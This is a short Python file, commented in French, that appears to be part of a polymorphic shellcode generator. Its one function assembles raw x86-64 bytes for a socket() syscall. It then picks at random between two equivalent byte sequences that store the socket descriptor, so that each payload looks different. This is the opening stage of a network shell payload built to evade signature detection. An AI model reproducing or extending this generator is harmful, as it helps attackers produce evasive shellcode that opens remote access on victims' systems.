#!/usr/bin/env python3
import random
from func_instru import *

def partie1(fullrdm):

    # PARTIE : SOCKET - CREATION DU SOCKET
    ## Exemple de code asm : 
    """
	mov al, 41
	mov dil, 2
	mov sil, 1
	add dl, 6
	syscall
    """ 
    
    moval = movx("al",41) # mov al, 41 - (ou équivalent)
    movdil = movx("dil",2) # mov dil, 2 - (ou équivalent)
    movsil = movx("sil",1) # mov sil, 1 - (ou équivalent)
    movdl = movx("dl",6) # mov dl, 6 - (ou équivalent)
    syscall = '\\x0f\\x05' # syscalls

    part1 = [
        '\\x50\\x41\\x58', # push rax, pop r8
        '\\x49\\x89\\xc0' # push r8, rax
    ]

    # Sélectionner aléatoirement un élément dans la liste part1[] :
    x = random.randint(0, 1)
    if x == 0 :
        choix = part1[0]
    elif x == 1 :
        choix = part1[1]

    # Concatenation
    resultat_concat = moval + movdil + movsil + movdl + syscall + choix

    return resultat_concat    